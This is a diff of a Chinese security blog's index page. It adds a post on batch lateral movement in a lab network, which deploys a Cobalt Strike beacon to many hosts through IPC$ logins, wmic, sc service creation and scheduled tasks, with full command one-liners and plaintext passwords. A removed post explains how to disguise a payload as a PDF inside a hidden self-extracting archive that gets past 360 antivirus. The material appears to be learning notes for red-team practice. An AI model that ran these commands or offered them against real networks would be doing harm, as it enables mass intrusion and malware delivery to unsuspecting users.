@@ -142,6 +142,135 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
+    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="藏青">
+      <meta itemprop="description" content="知行合一">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="藏青's BLOG">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">关于内网批量横向渗透的学习总结</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-08-31 12:07:47 / Modified: 17:05:26" itemprop="dateCreated datePublished" datetime="2020-08-31T12:07:47+08:00">2020-08-31</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>​        之前的学习中我们了解了关于横向移动的方式，当我们知道了这些方式，下一步当然是想要去提高速度，在这篇文章中我将带着大家学习如何来批量上线内网主机。</p>
+<h3 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h3><p>192.168.3.* 为仅主机模式的网段</p>
+<p>192.168.5.*为nat模式的网段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">OWA2013 192.168.3.144 192.168.5.58   边界机</span><br><span class="line">SRV-WEB-KIT 192.168.3.73   内网断网机</span><br><span class="line">PC-JERRY-KIT 192.168.3.75 192.168.5.59   内网出网机</span><br></pre></td></tr></table></figure>
+
+<h3 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h3><p>​        我们首先学习一下如何使用WMI来批量上线内网主机</p>
+<p>​        当我们获取了某个主机的密码，我们想测试是否有内网主机和这个主机的密码相同，首先需要扫描内网那些主机开放了445端口。</p>
+<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831135507642.png" alt="image-20200831135507642"></p>
+<p>​        得到这些开放445端口的ip后，我们将这些ip写到一个文件中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell echo 192.168.3.73 &gt;&gt; c:\windows\temp\host.txt</span><br><span class="line">shell echo 192.168.3.75 &gt;&gt; c:\windows\temp\host.txt</span><br></pre></td></tr></table></figure>
+
+<p>​        除了上面这种方式，当然也可以将host.txt在本地写好再上传到边界主机上。</p>
+<p>​        当我们得到哪些主机开放了445端口以后，我们想测试我们得到的密码在哪些主机上是相同的,可以使用net use建立ipc连接来进行测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell for &#x2F;f %i in (c:\windows\temp\host.txt) do net use \\%i\admin$ &#x2F;user:&quot;administrator&quot; &quot;xxxx&quot; &amp;&amp; if %errorlevel% equ 0 ( echo %i &gt;&gt; c:\windows\temp\login_succeed.txt ) &amp;&amp; net use \\%i\admin$ &#x2F;del</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831140152324.png" alt="image-20200831140152324"></p>
+<p>​        然后我们准备生成一个shell，再通过wmi来执行达到批量上线的目的。shell生成最好生成pivot listener，因为我们并不能确定内网主机是否能出外网</p>
+<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831140743070.png" alt="image-20200831140743070"></p>
+<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831140845228.png" alt="image-20200831140845228"></p>
+<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831140914981.png" alt="image-20200831140914981"></p>
+<p>​        生成好以后将生成的beacon.exe上传到边界主机</p>
+<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831141039574.png" alt="image-20200831141039574"></p>
+<p>​        使用wmic执行beacon.exe批量上线</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell for &#x2F;f %i in (c:\windows\temp\login_succeed.txt) do net use \\%i\admin$ &#x2F;user:&quot;administrator&quot; &quot;xxx&quot; &amp;&amp; copy C:\windows\temp\beacon.exe \\%i\admin$\temp\ &amp;&amp; wmic &#x2F;node:%i &#x2F;user:administrator &#x2F;password:xxx PROCESS call create &quot;\\%i\admin$\temp\beacon.exe&quot; &amp;&amp; net use \\%i\admin$ &#x2F;del</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831142003540.png" alt="image-20200831142003540"></p>
+<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831142030428.png" alt="image-20200831142030428"></p>
+<h3 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h3><p>​        在cobaltstrike中，内置了可以通过jump psexec来进行横向渗透的方法，这种方法我们既可以通过建立pivot listener来批量上线，也可以通过使用smb beacon来执行上线。下面我以smb beacon为例来演示下如何通过jump psexec来批量上线内网断网主机。<br>​        要使用smb beacon来上线，首先要创建一个smb类型的listener</p>
+<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831144047330.png" alt="image-20200831144047330"></p>
+<p>​        选择target，按住shift选中我们想要上线的几个目标。</p>
+<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831144139103.png" alt="image-20200831144139103"></p>
+<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831144237104.png" alt="image-20200831144237104"></p>
+<p>​        选择psexec模块，listener选择我们创建的smb listener</p>
+<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831144319681.png" alt="image-20200831144319681"></p>
+<p>​        选择lauch后，CS执行的操作如下</p>
+<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831144519451.png" alt="image-20200831144519451"></p>
+<p>​        同时两台内网的主机上线，因为用的是psexec的方式，所以是通过rundll32来执行上线的</p>
+<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831144603432.png" alt="image-20200831144603432"></p>
+<p>​        这里对比一下WMI批量上线，我们可以发现使用WMI上线后的权限为当前用户的权限，而使用psexec上线后的权限为system权限。</p>
+<p>​        最后我们再测试下使用psexec的这种上线方式能不能通过hash传递来利用，其他的步骤是一样的，只有在传递密码时输入变成了hash</p>
+<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831145220858.png" alt="image-20200831145220858"></p>
+<p>​        CobaltStrike执行的操作如下</p>
+<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831145543919.png" alt="image-20200831145543919"></p>
+<p>​        执行后也可以上线</p>
+<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831152157468.png" alt="image-20200831152157468"></p>
+<p>​        这里有一个小插曲，就是我第一次使用hash传递上线这两台主机时发现只有192.168.3.73这台主机上线，而win10 192.168.3.75没有上线，然后我是用impacket的psexec利用hash传递进行测试，发现无法使用administrator连接，但是我用net use 连接administrator账户又是正常的，经过排错，我发现是因为administrator账户是禁用状态导致的，启用后即可正常执行。</p>
+<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831152344500.png" alt="image-20200831152344500"></p>
+<p>​        这里也说明了一个问题，就是即使一个账户是禁用的，在我们知道账号密码的情况下，也是可以通过net use来连接的，但是无法通过pth来连接并且利用。</p>
+<h3 id="service"><a href="#service" class="headerlink" title="service"></a>service</h3><p>​        既然要在cobaltstrike通过service来进行批量上线的操作，首先需要生成一个service类型的shell，其次我们需要将这个shell上传到内网主机执行来上线。</p>
+<p>​        首先在目标边界主机上创建一个pivot类型的listener</p>
+<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831154146904.png" alt="image-20200831154146904"></p>
+<p>​        创建时候注意在host选择边界机内网所对应的ip，这个一定要注意，否则是上线不了断网主机的。</p>
+<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831154317379.png" alt="image-20200831154317379"></p>
+<p>​        生成一个Stageless，listener选择我们创建的listener，输出类型选择service类型</p>
+<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831154448333.png" alt="image-20200831154448333"></p>
+<p>​            将生成的文件上传到边界主机上</p>
+<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831154713116.png" alt="image-20200831154713116"></p>
+<p>​        使用sc来批量上线，至于login_success.txt那个文件怎么来的，参考WMI利用的那种方式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell for &#x2F;f %i in (c:\windows\temp\login_succeed.txt) do net use \\%i\admin$ &#x2F;user:&quot;administrator&quot; &quot;Admin123456&quot; &amp;&amp; copy C:\windows\temp\beacon.exe \\%i\admin$\temp\ &amp;&amp; sc \\%i create xxxxxxxxxxxxxxxxxxxxxxxx binpath&#x3D; &quot;c:\windows\temp\beacon.exe&quot;  &amp;&amp; sc \\%i start xxxxxxxxxxxxxxxxxxxxxxxx &amp;&amp; net use \\%i\admin$ &#x2F;del</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831155355171.png" alt="image-20200831155355171"></p>
+<p>​        使用完以后，记得要将这个服务删除</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell for &#x2F;f %i in (c:\windows\temp\login_succeed.txt) do net use \\%i\admin$ &#x2F;user:&quot;administrator&quot; &quot;Admin123456&quot; &amp;&amp; copy C:\windows\temp\beacon.exe \\%i\admin$\temp\ &amp;&amp; sc \\%i delete xxxxxxxxxxxxxxxxxxxxxxxx &amp;&amp; net use \\%i\admin$ &#x2F;del</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831155845466.png" alt="image-20200831155845466"></p>
+<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>​        我们也可以使用计划任务来批量横向渗透，至于前面生成shell的过程就不演示了，我们这里还是考虑目标主机是断网的一个状态，所以还是要创建一个pivot listener，生成一个Stageless类型的shell，上传到目标边界主机。使用如下命令来创建并执行计划任务上线</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell for &#x2F;f %i in (c:\windows\temp\login_succeed.txt) do net use \\%i\admin$ &#x2F;user:&quot;administrator&quot; &quot;xxxxx&quot; &amp;&amp; copy C:\windows\temp\beacon.exe \\%i\admin$\temp\ &amp;&amp; schtasks &#x2F;create &#x2F;s %i &#x2F;u &quot;administrator&quot; &#x2F;p &quot;xxxxx&quot; &#x2F;RL HIGHEST &#x2F;F &#x2F;tn &quot;xxxxxxxxxxx&quot; &#x2F;tr &quot;c:\windows\temp\beacon.exe&quot; &#x2F;sc DAILY &#x2F;mo 1 &#x2F;ST 11:06 &amp;&amp; schtasks &#x2F;run &#x2F;tn xxxxxxxxxxx &#x2F;s %i &#x2F;U &quot; administrator&quot; &#x2F;P &quot;xxxxx&quot; &amp;&amp; schtasks &#x2F;query &#x2F;s %i &#x2F;U &quot;administrator&quot; &#x2F;P &quot;xxxxx&quot; | findstr &quot;xxxxxxxxxxx&quot; &amp;&amp; schtasks &#x2F;delete &#x2F;F &#x2F;tn xxxxxxxxxxx &#x2F;s %i &#x2F;U &quot; administrator&quot; &#x2F;P &quot;xxxxx&quot; &amp;&amp; net use \\%i\admin$ &#x2F;del</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200831165538229.png" alt="image-20200831165538229"></p>
+<p>​        <strong>使用计划任务有一个限制，就是我们启动计划任务的用户必须是在线的状态，如果是注销状态或者其他没有登录的状态，则无法正常上线。</strong></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        通过上面的学习总结，我们发现仅仅依托cobaltstrike再加上几条命令，即可完成批量上线内网断网主机的目的，需要注意的是使用service来批量横向生成的shell类型要使用service类型，计划任务上线需要目标用户处于登录状态。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
     <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -173,7 +302,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-08-31 12:00:08" itemprop="dateModified" datetime="2020-08-31T12:00:08+08:00">2020-08-31</time>
+                <time title="Modified: 2020-08-31 12:05:28" itemprop="dateModified" datetime="2020-08-31T12:05:28+08:00">2020-08-31</time>
               </span>
 
           
@@ -197,7 +326,7 @@
 <p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828180840537.png" alt="image-20200828180840537"></p>
 <p>​        <img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828181006859.png" alt="image-20200828181006859"></p>
 <p>​            Pivot listener生成好以后，选择Packages-&gt;windows executalbe(s)</p>
-<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828181100073.png" alt="image-20200828181100073">+</p>
+<p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828181100073.png" alt="image-20200828181100073"></p>
 <p>​        配置过程中Listener选择我们刚生成的Pivot listener</p>
 <p><img src="/2020/08/28/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%96%AD%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200828181152418.png" alt="image-20200828181152418"></p>
 <p>​        假设我们这里已经拿到了内网断网主机的密码，使用ipc进行连接。</p>
@@ -323,7 +452,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-08-31 09:10:51" itemprop="dateModified" datetime="2020-08-31T09:10:51+08:00">2020-08-31</time>
+                <time title="Modified: 2020-08-31 13:34:03" itemprop="dateModified" datetime="2020-08-31T13:34:03+08:00">2020-08-31</time>
               </span>
 
           
@@ -578,7 +707,7 @@
 <p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828154502358.png" alt="image-20200828154502358"></p>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        通过对这些横向渗透的工具的学习，我们可以发现Crackmapexec主要使用在做批量操作时使用，impacket有很多针对不同协议进行横向移动的套件，SharpExec适合对文件操作比较好，CobaltStrike虽然横向的方式不是很多，不过针对我们也可以配合一些命令去执行。</p>
 <p><strong>参考文章</strong></p>
-<p><a href="https://wx.zsxq.com/dweb2/index/group/881148488552" target="_blank" rel="noopener">红队攻防揭秘</a></p>
+<p><a href>知识星球-红队攻防揭秘</a></p>
 <p><a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener">Crackmapexec</a></p>
 <p><a href="https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec/" target="_blank" rel="noopener">CrackMapExec - Ultimate Guide</a></p>
 <p><a href="https://blog.redxorblue.com/2019/04/sharpexec-lateral-movement-with-your.html" target="_blank" rel="noopener">SharpExec-您最喜欢的.NET Bling的横向运动</a></p>
@@ -1921,93 +2050,6 @@
   
   
 
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
-    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/07/31/%E5%85%B3%E4%BA%8E%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="藏青">
-      <meta itemprop="description" content="知行合一">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="藏青's BLOG">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/07/31/%E5%85%B3%E4%BA%8E%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA/" class="post-title-link" itemprop="url">关于自解压文件创建</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-07-31 10:42:09" itemprop="dateCreated datePublished" datetime="2020-07-31T10:42:09+08:00">2020-07-31</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-08-03 11:04:23" itemprop="dateModified" datetime="2020-08-03T11:04:23+08:00">2020-08-03</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">记录自解压文件创建的过程及遇到的问题</span><br></pre></td></tr></table></figure>
-
-<h3 id="创建过程"><a href="#创建过程" class="headerlink" title="创建过程"></a>创建过程</h3><p>首先准备好我们想要创建自解压的文件，我这里的内容如下</p>
-<p><img src="/2020/07/31/%E5%85%B3%E4%BA%8E%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA/image-20200731104349737.png" alt="image-20200731104349737"></p>
-<p>选中这两个文件进行压缩，配置压缩的文件名和压缩选项。</p>
-<p><img src="/2020/07/31/%E5%85%B3%E4%BA%8E%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA/image-20200731104546076.png" alt="image-20200731104546076"></p>
-<p>选择“高级”–》”常规“，设置解压后的路径,我这里选择的是temp目录下 </p>
-<p><img src="/2020/07/31/%E5%85%B3%E4%BA%8E%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA/image-20200731104902294.png" alt="image-20200731104902294"></p>
-<p>然后再选择”设置“，在设置程序-》提取后运行中输入想要运行的内容，我是希望能同时运行exe和pdf文件，先试试直接写上去行不行，不行的话就得创建一个bat来同时运行。</p>
-<p><img src="/2020/07/31/%E5%85%B3%E4%BA%8E%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA/image-20200731105125451.png" alt="image-20200731105125451"></p>
-<p>再选择模式-》全部隐藏。</p>
-<p><img src="/2020/07/31/%E5%85%B3%E4%BA%8E%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA/image-20200731105320926.png" alt="image-20200731105320926"></p>
-<p>还需要设置更新选项，这里需要选择 ”跳过已经存在的文件“，否则如果目标第二次运行这个文件，就会跳出一个框，让目标选择是否替换文件，可能会导致暴露。</p>
-<p><img src="/2020/07/31/%E5%85%B3%E4%BA%8E%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA/image-20200731110711963.png" alt="image-20200731110711963"></p>
-<p>然后我们需要修改一下图标，我在网上下载了一个图标进行添加</p>
-<p><img src="/2020/07/31/%E5%85%B3%E4%BA%8E%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA/image-20200731114155257.png" alt="image-20200731114155257"></p>
-<p>制作好后的文件如下：</p>
-<p><img src="/2020/07/31/%E5%85%B3%E4%BA%8E%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA/image-20200731114238680.png" alt="image-20200731114238680"></p>
-<p>如果有些目标没有注意或者没有开启显示扩展后缀，则有可能点击上线，最后，当目标点击我们的文件时，会打开正常的pdf内容，并且也可以正常上线。</p>
-<p><img src="/2020/07/31/%E5%85%B3%E4%BA%8E%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA/image-20200731114536851.png" alt="image-20200731114536851"></p>
-<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>使用自解压的方式即使shellcode是免杀的，360也会拦截，后来经过多次测试，得到结果如下。</p>
-<p>当使用pdf.exe等后缀作为自解压的后缀，执行时会被360拦截，当使用其他ico而不是自解压自带的图标，360会直接查杀。</p>
-<p><img src="/2020/07/31/%E5%85%B3%E4%BA%8E%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA/image-20200731151230910.png" alt="image-20200731151230910"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
   </div>
 
   
@@ -2078,7 +2120,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-count">17</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
